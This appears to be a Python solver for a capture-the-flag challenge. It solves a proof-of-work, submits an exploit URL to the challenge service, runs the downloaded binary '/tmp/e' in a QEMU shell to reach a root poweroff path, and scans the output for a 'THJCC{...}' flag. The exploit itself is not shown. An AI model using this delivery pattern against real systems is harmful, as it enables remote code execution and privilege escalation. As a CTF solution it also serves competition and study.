import argparse
import hashlib
import re
import socket
import time


def solve_pow(prefix: str, difficulty: int = 6) -> str:
    target = "0" * difficulty
    i = 0
    while True:
        ans = str(i)
        digest = hashlib.sha256((prefix + ans).encode()).hexdigest()
        if digest.startswith(target):
            return ans
        i += 1


def recv_some(sock: socket.socket, timeout: float = 1.0) -> str:
    sock.settimeout(timeout)
    try:
        data = sock.recv(65536)
    except socket.timeout:
        return ""
    if not data:
        return ""
    return data.decode("utf-8", errors="ignore")


def recv_until(sock: socket.socket, needles, timeout: float = 30.0) -> str:
    end = time.time() + timeout
    out = ""
    while time.time() < end:
        chunk = recv_some(sock, 1.0)
        if chunk:
            out += chunk
            if any(n in out for n in needles):
                break
    return out


def run_session(host: str, port: int, exploit_url: str) -> str:
    all_out = ""
    try:
        with socket.create_connection((host, port), timeout=10) as s:
            part = recv_until(s, ["[!] Your Answer", "[?] NEED_UPLOAD_EXPLOIT"], timeout=40)
            all_out += part

            m = re.search(r"Prefix:\s*([A-Za-z0-9]+)", all_out)
            if m:
                prefix = m.group(1)
                ans = solve_pow(prefix, 6)
                s.sendall((ans + "\n").encode())
                part = recv_until(s, ["[?] NEED_UPLOAD_EXPLOIT"], timeout=40)
                all_out += part

            if "[?] NEED_UPLOAD_EXPLOIT" not in all_out:
                return all_out + "\n[!] Did not reach upload prompt.\n"

            s.sendall(b"y\n")
            part = recv_until(s, ["Input your exploit url"], timeout=20)
            all_out += part

            s.sendall((exploit_url + "\n").encode())

            qemu_buf = recv_until(s, ["/ $", "~ $", "$ ", "# ", "cttyhack"], timeout=140)
            all_out += qemu_buf

            # run exploit and then leave shell so root executes poweroff
            s.sendall(b"/tmp/e\n")
            time.sleep(1.0)
            mid = recv_until(
                s,
                ["Run 'exit' to trigger root poweroff path", "/ $", "~ $", "$ ", "# "],
                timeout=40,
            )
            all_out += mid

            s.sendall(b"exit\n")

            end_time = time.time() + 120
            while time.time() < end_time:
                chunk = recv_some(s, 1.0)
                if not chunk:
                    break
                all_out += chunk
    except Exception as e:
        all_out += f"\n[EXCEPTION] {type(e).__name__}: {e}\n"

    return all_out


def main() -> None:
    ap = argparse.ArgumentParser()
    ap.add_argument("--host", required=True)
    ap.add_argument("--port", required=True, type=int)
    ap.add_argument("--url", required=True)
    ap.add_argument("--out", default="")
    args = ap.parse_args()

    out = run_session(args.host, args.port, args.url)
    print(out)

    m = re.search(r"(THJCC\{[^\n\r]+\}|FLAG:[^\n\r]+)", out)
    if m:
        print(f"\n[FOUND] {m.group(1)}")
    else:
        print("\n[FOUND] flag pattern not found")

    if args.out:
        with open(args.out, "w", encoding="utf-8", errors="ignore") as f:
            f.write(out)


if __name__ == "__main__":
    main()
